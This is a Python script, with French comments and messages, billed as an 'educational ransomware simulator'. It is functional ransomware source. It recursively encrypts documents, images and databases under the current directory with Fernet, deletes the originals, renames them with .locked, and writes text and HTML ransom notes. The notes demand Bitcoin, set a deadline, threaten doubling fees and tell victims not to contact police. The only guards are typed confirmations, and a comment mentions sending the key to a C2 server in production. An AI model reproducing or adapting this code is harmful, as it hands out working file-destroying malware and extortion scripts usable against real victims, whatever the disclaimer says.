#!/usr/bin/env python3
"""
⚠️ EDUCATIONAL RANSOMWARE SIMULATOR ⚠️
Auteur: Amolitho Baldé
Description: Simulation de ransomware à des fins éducatives UNIQUEMENT
AVERTISSEMENT: Ce code est destiné à des fins d'apprentissage en cybersécurité.
Ne JAMAIS utiliser à des fins malveillantes.
"""

import os
import sys
import time
import socket
import platform
from pathlib import Path
from cryptography.fernet import Fernet
from datetime import datetime, timedelta


class ModernRansomware:
    """Simulateur de ransomware moderne à but éducatif"""
    
    def __init__(self):
        """Initialise le ransomware simulator"""
        self.key = None
        self.victim_id = self._generate_victim_id()
        self.encrypted_count = 0
        self.ransom_amount = 0.5  # Bitcoin
        self.deadline = datetime.now() + timedelta(hours=72)
        self.contact_email = "recovery@example.sth"
        
        # Extensions de fichiers à cibler
        self.target_extensions = {
            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx',
            '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif',
            '.mp4', '.avi', '.mp3', '.zip', '.rar', '.sql',
            '.csv', '.json', '.xml', '.html', '.css', '.js'
        }
        
        # Fichiers à ne jamais toucher (pour la sécurité)
        self.excluded_files = {
            "encrypt.py", "decrypt.py", "encrypt_v0.py", "decrypt_v0.py", "my_key.key",
            "README_RANSOM.txt", "DECRYPT_INSTRUCTIONS.txt, README.md"
        }
    
    def _generate_victim_id(self):
        """Génère un identifiant unique pour la victime"""
        hostname = socket.gethostname()
        timestamp = int(time.time())
        return f"VIC-{hostname[:8].upper()}-{timestamp}"
    
    def _clear_screen(self):
        """Efface l'écran du terminal"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def display_warning_banner(self):
        """Affiche la bannière d'avertissement menaçante"""
        self._clear_screen()
        time.sleep(0.5)
        
        banner = """
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗         ║
║   ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║         ║
║   ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║         ║
║   ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║         ║
║   ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║         ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝         ║
║                                                                  ║
║                    🔒 RANSONLOCKER V1.0 🔒                       ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
"""
        print("\033[91m" + banner + "\033[0m")  # Rouge
        time.sleep(1)
    
    def display_encryption_message(self):
        """Affiche le message d'infection"""
        message = f"""
\033[91m╔══════════════════════════════════════════════════════════════════╗
║                    ⚠️  ATTENTION CRITIQUE ⚠️                       ║
╚══════════════════════════════════════════════════════════════════╝\033[0m

\033[93m[!] VOS FICHIERS ONT ÉTÉ CHIFFRÉS [!]\033[0m

┌─ INFORMATIONS SYSTÈME ────────────────────────────────────────────┐
│ 🆔 ID Victime    : {self.victim_id}
│ 💻 Système       : {platform.system()} {platform.release()}
│ 🖥️  Machine       : {socket.gethostname()}
│ 📅 Date infection : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
│ 📁 Fichiers ciblés: Tous documents, images, vidéos, bases de données
└───────────────────────────────────────────────────────────────────┘

\033[91m╔══════════════════════════════════════════════════════════════════╗
║                     QUE S'EST-IL PASSÉ ?                         ║
╚══════════════════════════════════════════════════════════════════╝\033[0m

Tous vos fichiers importants ont été chiffrés avec un algorithme
cryptographique militaire (AES-256). Sans la clé privée, il est
\033[91mMATHÉMATIQUEMENT IMPOSSIBLE\033[0m de récupérer vos données.

❌ Ne tentez PAS de :
   • Déchiffrer vous-même (vous détruirez vos fichiers)
   • Utiliser des logiciels de récupération (inefficace)
   • Réinstaller votre système (les fichiers resteront chiffrés)
   • Contacter la police (vos fichiers seront perdus à jamais)

\033[92m╔══════════════════════════════════════════════════════════════════╗
║                  COMMENT RÉCUPÉRER VOS FICHIERS ?                ║
╚══════════════════════════════════════════════════════════════════╝\033[0m

💰 MONTANT DE LA RANÇON : {self.ransom_amount} BTC (~$30,000 USD)
⏰ DÉLAI : {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}

\033[91m⚠️  IMPORTANT : Après le délai, le montant DOUBLE toutes les 24h
⚠️  Après 7 jours, la clé sera DÉTRUITE définitivement\033[0m

┌─ INSTRUCTIONS DE PAIEMENT ────────────────────────────────────────┐
│
│ 1️⃣  Téléchargez le navigateur TOR : https://www.torproject.org
│ 2️⃣  Achetez des Bitcoins sur Coinbase, Binance ou LocalBitcoins
│ 3️⃣  Visitez notre site : http://sth.sth
│ 4️⃣  Entrez votre ID victime : {self.victim_id}
│ 5️⃣  Suivez les instructions de paiement
│ 6️⃣  Après paiement, vous recevrez le décrypteur automatiquement
│
│ 📧 Support technique : {self.contact_email}
│ 💬 Chat en direct disponible 24/7 sur notre site
│
└───────────────────────────────────────────────────────────────────┘

\033[93m[!] GARANTIE : Nous sommes des professionnels. Des centaines de victimes
    ont déjà récupéré leurs fichiers. Nous tenons nos engagements.\033[0m

\033[91m[!] Ce message restera affiché jusqu'au paiement de la rançon [!]\033[0m
"""
        print(message)
    
    def create_ransom_note(self):
        """Crée le fichier README avec les instructions de rançon"""
        note_content = f"""
═══════════════════════════════════════════════════════════════════
                    ⚠️  VOS FICHIERS SONT CHIFFRÉS ⚠️
═══════════════════════════════════════════════════════════════════

ID VICTIME: {self.victim_id}
DATE: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Tous vos fichiers personnels ont été chiffrés avec un algorithme
cryptographique militaire. Sans notre clé de déchiffrement privée,
il est IMPOSSIBLE de récupérer vos données.

MONTANT: {self.ransom_amount} BTC
DÉLAI: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}

INSTRUCTIONS:
1. Téléchargez TOR Browser: https://www.torproject.org
2. Visitez: http://sth.sth
3. Entrez votre ID: {self.victim_id}
4. Effectuez le paiement
5. Recevez le décrypteur

CONTACT: {self.contact_email}

⚠️  NE SUPPRIMEZ PAS CE FICHIER ⚠️
Sans ce fichier, vous ne pourrez pas récupérer vos données!
═══════════════════════════════════════════════════════════════════
"""
        
        with open("README_RANSOM.txt", "w") as f:
            f.write(note_content)
        
        # Créer aussi une version HTML pour un effet plus visuel
        html_note = f"""
<!DOCTYPE html>
<html>
<head>
    <title>VOS FICHIERS SONT CHIFFRÉS</title>
    <style>
        body {{
            background: #000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            padding: 50px;
            text-align: center;
        }}
        .warning {{
            border: 3px solid #ff0000;
            padding: 30px;
            margin: 20px auto;
            max-width: 800px;
            animation: blink 1s infinite;
        }}
        @keyframes blink {{
            50% {{ border-color: #ffffff; }}
        }}
        h1 {{ font-size: 3em; }}
        .victim-id {{ color: #ffff00; font-size: 1.5em; }}
    </style>
</head>
<body>
    <h1>⚠️ CRYPTOLOCKER V4.0 ⚠️</h1>
    <div class="warning">
        <h2>VOS FICHIERS ONT ÉTÉ CHIFFRÉS</h2>
        <p class="victim-id">ID: {self.victim_id}</p>
        <p>Montant de la rançon: {self.ransom_amount} BTC</p>
        <p>Délai: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p>Contact: {self.contact_email}</p>
    </div>
</body>
</html>
"""
        with open("RANSOM_NOTE.html", "w") as f:
            f.write(html_note)
    
    def generate_key(self):
        """Génère la clé de chiffrement"""
        print("\n\033[93m[*] Génération de la clé de chiffrement...\033[0m")
        time.sleep(0.5)
        self.key = Fernet.generate_key()
        
        # Sauvegarder la clé (en production, elle serait envoyée au serveur C2)
        with open("my_key.key", "wb") as key_file:
            key_file.write(self.key)
        print("\033[92m[✓] Clé générée avec succès\033[0m")
    
    def scan_files(self):
        """Scanne et liste les fichiers à chiffrer"""
        print("\n\033[93m[*] Scan du système en cours...\033[0m")
        time.sleep(1)
        
        files_to_encrypt = []
        for root, dirs, files in os.walk("."):
            for file in files:
                filepath = os.path.join(root, file)
                ext = Path(file).suffix.lower()
                
                if file not in self.excluded_files and ext in self.target_extensions:
                    files_to_encrypt.append(filepath)
        
        print(f"\033[92m[✓] {len(files_to_encrypt)} fichier(s) vulnérable(s) détecté(s)\033[0m")
        return files_to_encrypt
    
    def encrypt_file(self, filepath):
        """Chiffre un fichier et renomme avec extension .locked"""
        try:
            with open(filepath, "rb") as f:
                data = f.read()
            
            fernet = Fernet(self.key)
            encrypted = fernet.encrypt(data)
            
            # Renommer avec extension .locked
            locked_filepath = filepath + ".locked"
            with open(locked_filepath, "wb") as f:
                f.write(encrypted)
            
            # Supprimer l'original
            os.remove(filepath)
            
            return True
        except Exception as e:
            return False
    
    def encrypt_all_files(self, files):
        """Chiffre tous les fichiers avec barre de progression"""
        print("\n\033[91m[!] CHIFFREMENT EN COURS...\033[0m\n")
        
        for i, filepath in enumerate(files, 1):
            if self.encrypt_file(filepath):
                self.encrypted_count += 1
                filename = os.path.basename(filepath)
                
                # Barre de progression
                progress = int((i / len(files)) * 50)
                bar = "█" * progress + "░" * (50 - progress)
                percentage = (i / len(files)) * 100
                
                print(f"\r\033[93m[{bar}] {percentage:.1f}% | {filename}\033[0m", end="")
                time.sleep(0.1)  # Effet dramatique
        
        print("\n")
    
    def display_final_message(self):
        """Affiche le message final après chiffrement"""
        print("\033[91m" + "="*70)
        print(f"║ CHIFFREMENT TERMINÉ : {self.encrypted_count} fichier(s) verrouillé(s)")
        print("="*70 + "\033[0m\n")
        
        print("\033[93m📋 Un fichier README_RANSOM.txt a été créé sur votre bureau")
        print("📋 Un fichier RANSOM_NOTE.html contient les instructions détaillées\033[0m\n")
        
        print("\033[91m[!] Vos fichiers portent maintenant l'extension .locked")
        print("[!] Ils sont IRRÉCUPÉRABLES sans la clé de déchiffrement")
        print(f"[!] Vous avez jusqu'au {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}\033[0m\n")
    
    def run(self):
        """Exécute le ransomware simulator"""
        # Affichage du banner
        self.display_warning_banner()
        
        # Message d'avertissement éducatif
        print("\033[93m" + "="*70)
        print("⚠️  AVERTISSEMENT: CECI EST UNE SIMULATION ÉDUCATIVE ⚠️")
        print("Ce code est destiné uniquement à l'apprentissage en cybersécurité")
        print("="*70 + "\033[0m\n")
        
        response = input("Tapez 'SIMULATE' pour continuer (ou Ctrl+C pour annuler): ")
        if response != "SIMULATE":
            print("\n❌ Simulation annulée")
            return
        
        # Génération de la clé
        self.generate_key()
        
        # Scan des fichiers
        files = self.scan_files()
        
        if not files:
            print("\n⚠️  Aucun fichier cible trouvé")
            return
        
        # Confirmation finale
        print(f"\n\033[91m[!] {len(files)} fichier(s) vont être chiffrés [!]\033[0m")
        confirm = input("Tapez 'YES' pour confirmer: ")
        if confirm != "YES":
            print("\n❌ Simulation annulée")
            return
        
        # Chiffrement
        self.encrypt_all_files(files)
        
        # Créer la note de rançon
        self.create_ransom_note()
        
        # Message de fin
        self.display_final_message()
        
        # Afficher le message de rançon
        time.sleep(2)
        self.display_encryption_message()


def main():
    """Point d'entrée principal"""
    ransomware = ModernRansomware()
    ransomware.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[91m[!] Interruption détectée. Le processus continue en arrière-plan...\033[0m")
        time.sleep(1)
        print("\033[93m[!] Juste une blague 😄 Simulation interrompue.\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[91m[!] Erreur critique: {e}\033[0m")
        sys.exit(1)